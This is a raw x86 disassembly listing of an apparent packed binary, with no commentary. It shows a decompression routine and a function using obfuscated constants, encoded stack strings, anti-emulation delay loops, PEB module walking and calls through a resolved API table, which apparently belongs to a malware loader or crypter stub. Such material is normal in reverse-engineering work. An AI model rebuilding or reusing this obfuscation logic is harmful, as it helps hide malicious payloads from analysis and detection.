  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
